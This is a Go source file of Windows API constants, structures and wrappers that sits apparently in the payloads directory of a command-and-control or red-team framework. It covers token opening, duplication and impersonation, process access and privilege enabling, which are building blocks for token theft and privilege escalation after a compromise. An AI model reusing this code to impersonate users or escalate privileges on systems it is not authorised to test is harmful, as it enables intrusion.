// server/docker/payloads/Windows/windows_common.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// Windows API constants - Token Access Rights
const (
	TOKEN_QUERY             = 0x0008
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_ALL_ACCESS        = 0xF01FF
	MAXIMUM_ALLOWED         = 0x2000000
)

// Windows API constants - Process Access Rights
const (
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_ALL_ACCESS        = 0x1F0FFF
)

// Windows API constants - Security
const (
	SecurityImpersonation = 2
	TokenPrimary          = 1
	TokenImpersonation    = 2
)

// Windows API constants - Process Creation
const (
	CREATE_NO_WINDOW           = 0x08000000
	CREATE_UNICODE_ENVIRONMENT = 0x00000400
	CREATE_NEW_CONSOLE         = 0x00000010
	CREATE_NEW_PROCESS_GROUP   = 0x00000200
	CREATE_SUSPENDED           = 0x00000004
	STARTF_USESHOWWINDOW       = 0x00000001
	STARTF_USESTDHANDLES       = 0x00000100
	SW_SHOW                    = 5
	SW_HIDE                    = 0
)

// Windows API constants - Tool Help
const (
	TH32CS_SNAPPROCESS = 0x00000002
	TH32CS_SNAPTHREAD  = 0x00000004
	TH32CS_SNAPMODULE  = 0x00000008
	MAX_PATH           = 260
)

// Windows API constants - Logon Types
const (
	LOGON32_LOGON_INTERACTIVE       = 2
	LOGON32_LOGON_NETWORK           = 3
	LOGON32_LOGON_BATCH             = 4
	LOGON32_LOGON_SERVICE           = 5
	LOGON32_LOGON_NETWORK_CLEARTEXT = 8
	LOGON32_LOGON_NEW_CREDENTIALS   = 9

	LOGON32_PROVIDER_DEFAULT = 0
	LOGON32_PROVIDER_WINNT50 = 3
)

// Windows API constants - Privileges
const (
	SE_PRIVILEGE_ENABLED = 0x00000002
)

var (
	procGetUserNameW = modAdvapi32.NewProc("GetUserNameW")
)

// Windows API DLLs
var (
	modAdvapi32 = syscall.NewLazyDLL("advapi32.dll")
	modKernel32 = syscall.NewLazyDLL("kernel32.dll")
	modNtdll    = syscall.NewLazyDLL("ntdll.dll")
	modUser32   = syscall.NewLazyDLL("user32.dll")
	modPsapi    = syscall.NewLazyDLL("psapi.dll")
)

// Windows API functions - Token Management
var (
	procOpenProcessToken        = modAdvapi32.NewProc("OpenProcessToken")
	procOpenThreadToken         = modAdvapi32.NewProc("OpenThreadToken")
	procDuplicateTokenEx        = modAdvapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser = modAdvapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = modAdvapi32.NewProc("RevertToSelf")
	procGetTokenInformation     = modAdvapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW       = modAdvapi32.NewProc("LookupAccountSidW")
	procLogonUserW              = modAdvapi32.NewProc("LogonUserW")
	procLogonUserExW            = modAdvapi32.NewProc("LogonUserExW")
	procCreateProcessAsUserW    = modAdvapi32.NewProc("CreateProcessAsUserW")
	procCreateProcessWithTokenW = modAdvapi32.NewProc("CreateProcessWithTokenW")
	procAdjustTokenPrivileges   = modAdvapi32.NewProc("AdjustTokenPrivileges")
	procLookupPrivilegeValueW   = modAdvapi32.NewProc("LookupPrivilegeValueW")
)

// Windows API functions - Process Management
var (
	procOpenProcess              = modKernel32.NewProc("OpenProcess")
	procCloseHandle              = modKernel32.NewProc("CloseHandle")
	procGetCurrentProcess        = modKernel32.NewProc("GetCurrentProcess")
	procGetCurrentProcessId      = modKernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThread         = modKernel32.NewProc("GetCurrentThread")
	procTerminateProcess         = modKernel32.NewProc("TerminateProcess")
	procGetExitCodeProcess       = modKernel32.NewProc("GetExitCodeProcess")
	procWaitForSingleObject      = modKernel32.NewProc("WaitForSingleObject")
	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = modKernel32.NewProc("Process32FirstW")
	procProcess32NextW           = modKernel32.NewProc("Process32NextW")
)

// Windows API functions - Environment
var (
	procGetEnvironmentStringsW  = modKernel32.NewProc("GetEnvironmentStringsW")
	procFreeEnvironmentStringsW = modKernel32.NewProc("FreeEnvironmentStringsW")
)

// PROCESSENTRY32 structure for process enumeration
type PROCESSENTRY32 struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [MAX_PATH]uint16
}

// TokenUser structure for GetTokenInformation
type TokenUser struct {
	User SIDAndAttributes
}

type SIDAndAttributes struct {
	Sid        *syscall.SID
	Attributes uint32
}

// STARTUPINFO structure for process creation
type STARTUPINFO struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	LpReserved2   *byte
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
}

// PROCESS_INFORMATION structure for process creation
type PROCESS_INFORMATION struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

// Privilege structures
type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

// Common Windows API wrapper functions

// GetCurrentProcess returns a pseudo handle to the current process
func GetCurrentProcess() syscall.Handle {
	ret, _, _ := procGetCurrentProcess.Call()
	return syscall.Handle(ret)
}

// GetCurrentThread returns a pseudo handle to the current thread
func GetCurrentThread() syscall.Handle {
	ret, _, _ := procGetCurrentThread.Call()
	return syscall.Handle(ret)
}

// OpenProcess opens a handle to a process
func OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (syscall.Handle, error) {
	inherit := uint32(0)
	if inheritHandle {
		inherit = 1
	}

	ret, _, err := procOpenProcess.Call(
		uintptr(desiredAccess),
		uintptr(inherit),
		uintptr(processId),
	)

	if ret == 0 {
		return 0, err
	}

	return syscall.Handle(ret), nil
}

// OpenProcessToken opens a process token
func OpenProcessToken(process syscall.Handle, access uint32, token *syscall.Token) error {
	ret, _, err := procOpenProcessToken.Call(
		uintptr(process),
		uintptr(access),
		uintptr(unsafe.Pointer(token)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// OpenThreadToken opens a thread token
func OpenThreadToken(thread syscall.Handle, access uint32, openAsSelf bool, token *syscall.Token) error {
	var openAsSelfVal uint32
	if openAsSelf {
		openAsSelfVal = 1
	}

	ret, _, err := procOpenThreadToken.Call(
		uintptr(thread),
		uintptr(access),
		uintptr(openAsSelfVal),
		uintptr(unsafe.Pointer(token)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// DuplicateTokenEx duplicates a token
func DuplicateTokenEx(existingToken syscall.Handle, desiredAccess uint32, tokenAttributes *syscall.SecurityAttributes, impersonationLevel uint32, tokenType uint32, newToken *syscall.Handle) error {
	ret, _, err := procDuplicateTokenEx.Call(
		uintptr(existingToken),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(tokenAttributes)),
		uintptr(impersonationLevel),
		uintptr(tokenType),
		uintptr(unsafe.Pointer(newToken)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// ImpersonateLoggedOnUser impersonates a token
func ImpersonateLoggedOnUser(token syscall.Handle) error {
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(token))
	if ret == 0 {
		return err
	}
	return nil
}

// RevertToSelf reverts impersonation
func RevertToSelf() error {
	ret, _, err := procRevertToSelf.Call()
	if ret == 0 {
		return err
	}
	return nil
}

// CloseHandle closes a Windows handle
func CloseHandle(handle syscall.Handle) {
	if handle != 0 && handle != syscall.InvalidHandle {
		procCloseHandle.Call(uintptr(handle))
	}
}

// GetCurrentProcessId returns the current process ID
func GetCurrentProcessId() uint32 {
	ret, _, _ := procGetCurrentProcessId.Call()
	return uint32(ret)
}

// TerminateProcess terminates a process
func TerminateProcess(process syscall.Handle, exitCode uint32) error {
	ret, _, err := procTerminateProcess.Call(
		uintptr(process),
		uintptr(exitCode),
	)
	if ret == 0 {
		return err
	}
	return nil
}

// GetExitCodeProcess gets the exit code of a process
func GetExitCodeProcess(process syscall.Handle, exitCode *uint32) error {
	ret, _, err := procGetExitCodeProcess.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(exitCode)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

// WaitForSingleObject waits for an object to be signaled
func WaitForSingleObject(handle syscall.Handle, milliseconds uint32) (uint32, error) {
	ret, _, err := procWaitForSingleObject.Call(
		uintptr(handle),
		uintptr(milliseconds),
	)
	if ret == 0xFFFFFFFF { // WAIT_FAILED
		return 0, err
	}
	return uint32(ret), nil
}

// EnablePrivilege enables a privilege in the current process token
func EnablePrivilege(privilegeName string) error {
	// Get current process token
	var token syscall.Token
	err := OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf(ErrCtx(E3, err.Error()))
	}
	defer token.Close()

	// Convert privilege name to UTF16
	privNameUTF16, err := syscall.UTF16PtrFromString(privilegeName)
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Look up privilege LUID
	var luid LUID
	ret, _, err := procLookupPrivilegeValueW.Call(
		0, // lpSystemName (NULL = local)
		uintptr(unsafe.Pointer(privNameUTF16)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf(ErrCtx(E4, err.Error()))
	}

	// Enable the privilege
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0, // DisableAllPrivileges = FALSE
		uintptr(unsafe.Pointer(&tp)),
		uintptr(unsafe.Sizeof(tp)),
		0, // PreviousState
		0, // ReturnLength
	)
	if ret == 0 {
		return fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	return nil
}
